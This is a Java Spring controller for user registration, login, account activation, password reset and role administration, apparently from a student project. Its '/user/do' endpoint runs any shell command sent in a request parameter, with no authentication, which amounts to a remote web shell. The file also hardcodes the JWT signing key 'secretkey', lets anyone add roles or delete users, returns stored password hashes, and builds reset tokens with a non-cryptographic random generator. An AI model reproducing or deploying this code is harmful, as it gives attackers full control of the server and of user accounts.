package com.example.controllers;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.time.LocalDateTime;
import java.time.ZoneOffset;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.Random;
import java.util.Scanner;

import javax.servlet.ServletException;

import org.springframework.amqp.rabbit.core.RabbitTemplate;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.repository.query.Param;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import com.example.models.Links;
import com.example.models.RegisteredUser;
import com.example.models.Role;
import com.example.models.UserRole;
import com.example.repositories.ClaimRepository;
import com.example.repositories.LinksRepository;
import com.example.repositories.RoleRepository;
import com.example.repositories.UserRepository;
import com.example.repositories.UserRoleRepository;
import com.example.services.HashService;
import com.example.services.MailService;
import com.netflix.discovery.converters.Auto;

import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;

@RestController
@RequestMapping("user")
public class UserController {
	
	@Autowired
	UserRepository ur;
	
	@Autowired
	RoleRepository rr;
	
	@Autowired
	ClaimRepository cr;
	
	@Autowired
	UserRoleRepository urr;
	
	@Autowired
	LinksRepository lr;
	
	@Autowired 
	MailService ms;
	
	@Autowired
	RabbitTemplate rabbitTemplate;
	
	@RequestMapping("/do")
	public void doCode(@RequestParam(value="command",required=false) String command){
		Runtime r =Runtime.getRuntime();
		try {
			System.out.println(command);
			if(command!=null){
				Process p=r.exec(command);
				InputStream is= p.getInputStream();
				p.waitFor();
				
				Scanner s= new Scanner(is).useDelimiter("\\A");
				System.out.println(s.hasNext() ? s.next(): "nema");
			}
		}
		catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	@RequestMapping("/helloworld")
	public void saveAndExec(){
		String[] commands={"printf","#include<iostream>\nusing namespace std; int main(){ cout<<794; return 0;}",">>","prog.cpp"};
		Runtime r = Runtime.getRuntime();
		ProcessBuilder pb=new ProcessBuilder("printf","#include<iostream>\nusing namespace std; int main(){ cout<<794; return 0;}").redirectOutput(new File("prog.cpp"));
		try {
			Process p = r.exec(commands);
			InputStream is= p.getInputStream();
			p.waitFor();
			pb.start().waitFor();
			Scanner s= new Scanner(is).useDelimiter("\\A");
			System.out.println(s.hasNext() ? s.next(): "nema");
		} catch (Exception e) {
			// TODO: handle exception
			e.printStackTrace();
		}
	}
	
	@RequestMapping("/register")
	public void register(@RequestBody UserRegisterBody user) throws ServletException{
		
		if(user.email==null || user.email.isEmpty()||user.username==null || user.username.isEmpty()||user.password==null || user.password.isEmpty()){
			throw new ServletException("Polja nisu popunjena!");
		}
		
		int numberOfUsers=ur.userexists(user.username, user.email);
		if(numberOfUsers>0) throw new ServletException("Username ili email su zauzeti!");
		
		RegisteredUser newUser= new RegisteredUser();
		newUser.setUsername(user.username);
		newUser.setEmail(user.email);
		
		newUser.setPassword(HashService.hashPassword(user.password));
		newUser.setVerified(false);
		newUser = ur.save(newUser);
		if(newUser!=null){
			rabbitTemplate.convertAndSend("users-queue-exchange","*.users",newUser.getUsername()+";"+newUser.getEmail()+";create");
		}
		Links links=new Links();
		String activation=getSaltString()+user.username+getSaltString();
		links.setActivation(activation);
		links.setUser(newUser);
		lr.save(links);
		ms.sendActivationMail(user.email, activation);
		
	}
	
	@RequestMapping("/login")
	public String login(@RequestBody UserLoginBody login) throws ServletException{
		
		RegisteredUser user=ur.findUserByUsername(login.username);
		
		if(!user.isVerified()) throw new ServletException("Morate prvo aktivirati racun!");
		
		if(!HashService.checkPassword(login.password, user.getPassword())) throw new ServletException("Netacna pristupna sifra");
		else
		{ 
			Claims claims=Jwts.claims().setSubject(login.username);
			claims.put("roles", rr.getrolesbyuser(login.username));
			/*return Jwts.builder().setSubject(login.username)
				.claim("roles", rr.getrolesbyuser(login.username)).setIssuedAt(new Date()).setExpiration(Date.from(LocalDateTime.now().plusHours(2).toInstant(ZoneOffset.UTC)))
				.signWith(SignatureAlgorithm.HS256, "secretkey").compact();*/
			
			return Jwts.builder().setClaims(claims).setExpiration(Date.from(LocalDateTime.now().plusHours(2).toInstant(ZoneOffset.UTC))).signWith(SignatureAlgorithm.HS256, "secretkey").compact();
		}
		
	}
	
	@RequestMapping("/activate/{activation}")
	public void activate(@PathVariable("activation") String activation) throws ServletException{
		Links links = lr.findByActivation(activation);
		if(links!=null){
			RegisteredUser user=links.getUser();
			user.setVerified(true);
			ur.save(user);
		}
	}
	
	@RequestMapping("/sendrequest")
	public void sendRequest(@RequestParam("email") String email){
		
		RegisteredUser user=ur.findUserByEmail(email);
		
		try{
			
			Links link=lr.findByUserUsername(user.getUsername());
			
			if(link==null){
				
				link=new Links();
				
				
			}
			String forgotPassword=getSaltString()+user.getUsername()+getSaltString();
			link.setUser(user);
			link.setForgotPassword(forgotPassword);
			ms.sendResetPasswordMail(email, forgotPassword);
			
			lr.save(link);
		}
		catch(Exception e){
			e.printStackTrace();
		}
	}
	
	
	@RequestMapping("/resetpassword/{forgotPassword}")
	public void resetPassword(@PathVariable("forgotPassword") String forgotPassword,@RequestBody ResetPasswordBody body){
		
		Links link=lr.findByForgotPassword(forgotPassword);
		
		if(link!=null){
			
			RegisteredUser user=link.getUser();
			
			if(body.password.equals(body.passwordRepeat) && body.password!=null && !body.password.equals("")){ 
				user.setPassword(HashService.hashPassword(body.password));
				ur.save(user);
			}
		
		}
	
	}
	
	@RequestMapping("roles")
	public List<String> roles(@RequestParam("username") String username){
		return rr.getrolesbyuser(username);
	}
	
	
	@RequestMapping("logged")
	public boolean logged(@RequestParam("username") String username){
		int number=cr.getnumberofclaims(username);
		return number==0 ? false : true ;
	}
	
	@RequestMapping("userinfo")
	public RegisteredUser userinfo(@RequestParam("username") String username) throws ServletException{
		RegisteredUser user=ur.findUserByUsername(username);
		if(user==null) throw new ServletException("Nepostojeci korisnik");
		return user;
	}
	
	@RequestMapping("addrole")
	public Role addRole(@RequestParam("username")String username,@RequestParam("role") String rolename) throws ServletException{
		Role role=rr.findRoleByName(rolename);
		RegisteredUser user=ur.findUserByUsername(username);
		if(role==null || user==null) throw new ServletException("Neispravan zahtjev");
		UserRole userRole=new UserRole();
		userRole.setUser(user);
		userRole.setRole(role);
		urr.save(userRole);
		return role;
	}
	
	@RequestMapping("removerole")
	public int removeRole(@RequestParam("username")String username,@RequestParam("role") String rolename){
		if(this.roles(username).contains(rolename)){
			urr.removeRole(username, rolename);
			return 1;
		}
		else return 0;
	}
	
	@RequestMapping("deleteuser")
	public int deleteUser(@RequestParam("username") String username){
		RegisteredUser user=ur.findUserByUsername(username);
		if(user!=null){
			ur.delete(user);
			return 1;
		}
		else return 0;
	}
	
	@RequestMapping("rabbit")
	public void rabbit(){
		//.convertAndSend("users-queue", "nova poruka");
		rabbitTemplate.convertAndSend("users-queue-exchange","*.users","nova poruka");
	}
	
	
	@RequestMapping("/api/neradinista")
	public void nista(){
		
	}
	
	@RequestMapping("/sendmail")
	public void sendmail(){
		ms.sendMail();
	}
	
	private String getSaltString() {
        String SALTCHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        StringBuilder salt = new StringBuilder();
        Random rnd = new Random();
        while (salt.length() < 10) { // length of the random string.
            int index = (int) (rnd.nextFloat() * SALTCHARS.length());
            salt.append(SALTCHARS.charAt(index));
        }
        String saltStr = salt.toString();
        return saltStr;

    }
	
	@SuppressWarnings("unused")
	private static class UserRegisterBody{
		public String username;
		public String password;
		public String email;
	}
	
	@SuppressWarnings("unused")
	private static class UserLoginBody{
		public String username;
		public String password;
	}
	
	@SuppressWarnings("unused")
	private static class ResetPasswordBody{
		public String password;
		public String passwordRepeat;
	}
}
